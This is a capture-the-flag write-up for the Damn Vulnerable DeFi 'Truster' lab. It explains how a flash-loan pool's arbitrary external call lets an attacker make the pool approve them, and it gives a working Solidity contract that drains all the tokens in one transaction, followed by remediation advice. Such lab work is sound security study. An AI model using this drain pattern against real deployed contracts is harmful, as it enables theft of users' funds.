---
Created: 2026-11-24
tags:
  - easy
  - web3
  - foundry
  - solidity
  - erc20
---
# 1. Overview of the Files

## Scenario & Objective

More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

## Files Analysis

`TrusterLenderPool.sol `

```js
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
}
```

`Truster.t.sol `

```js
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
```

### Execution Mechanics

1. **Arbitrary External Call as the Pool (`target.functionCall(data)`):**

    - The pool accepts an arbitrary `target` address and `data` payload from the caller and executes `target.functionCall(data)`.

    - Inside `target`, **`msg.sender` is `address(TrusterLenderPool)`**. Passing `target = address(token)` allows an attacker to make the pool invoke any ERC-20 function on itself.

2. **Repayment Check Bypass (`amount = 0` + `approve`):**

    - The pool only verifies that `token.balanceOf(address(this)) >= balanceBefore` at the end of `flashLoan`.

    - Calling `flashLoan` with `amount = 0` and `data = abi.encodeCall(token.approve, (spender, TOKENS_IN_POOL))` leaves the pool's token balance unchanged (`balanceAfter == balanceBefore`), so the check succeeds while granting `spender` full ERC-20 approval over the pool's `1,000,000` DVT.

3. **Single-Transaction Nonce Constraint (`vm.getNonce(player) == 1`):**

    - Each direct external call made by an EOA (`player`) increments its `nonce` by 1. Calling `pool.flashLoan(...)` and then `token.transferFrom(...)` directly from `player` would result in `nonce == 2` and fail the test.

    - **EVM `CREATE` Behavior:** Deploying an attacker contract via `new Attacker(...)` executes its `constructor()` inside the **same single creation transaction** (`nonce` becomes `1`). Placing both `pool.flashLoan(...)` and `token.transferFrom(...)` inside the constructor drains the pool atomically in one transaction.

---
# Exploit
## Vulnerability

Arbitrary External Call in Flash Loan

`flashLoan`

```js
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data);

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```

`TrusterLenderPool.sol`

```js
uint256 balanceBefore = token.balanceOf(address(this));

token.transfer(borrower, amount);
target.functionCall(data);

if (token.balanceOf(address(this)) < balanceBefore) {
    revert RepayFailed();
}
```

## PoC

### 1. Code Inside `test_truster()`


```js
    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        new TrusterExploit(pool, token, recovery);
    }
```

### 2. Helper Contract `Truster.t.sol`

We need it at the bottom of the file:

```js
contract TrusterExploit {
    constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery) {
        uint256 amount = token.balanceOf(address(pool));

        // 1. Prepara il calldata per far eseguire alla pool: token.approve(address(this), amount)
        bytes memory data = abi.encodeCall(token.approve, (address(this), amount));

        // 2. Chiede un flash loan di 0 token facendo chiamare alla pool il contratto token
        pool.flashLoan(0, address(this), address(token), data);

        // 3. Sfrutta l'allowance appena ottenuta per spostare tutti i token su recovery
        token.transferFrom(address(pool), recovery, amount);
    }
}
```

### Explanation

- When`player` execute `new TrusterExploit(...)`, the EVM counts a single transaction (`nonce = 1`).

- The `constructor` ask the loan of `0` DVT with `target` address as  `token` e come `data` la chiamata `approve` a favore di `TrusterExploit` (`address(this)`).

- In the same atomic transaction `transferFrom` withdraw everything from the `pool` and send it to `recovery`.

## Test

```bash
└─$ forge test --match-path Truster.t.sol -vvvv

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 983.23µs (345.05µs CPU time)
Ran 1 test suite in 6.41ms (983.23µs CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

---

# 3. Remediation (Production Fixes)

Remove Arbitrary `target.functionCall(data)`:

- A flash loan pool must never execute arbitrary calls on user-supplied `target` addresses.
- Implement the **ERC-3156 (`IERC3156FlashLender`)** standard, where the callback (`onFlashLoan`) is strictly invoked on the `receiver` (`IERC3156FlashBorrower`) address rather than an arbitrary target.

Principle of Least Privilege (Asset Isolation):

- Contracts holding protocol liquidity should never expose generic low-level call primitives (`call` / `functionCall`) without strict target and function-selector allowlists.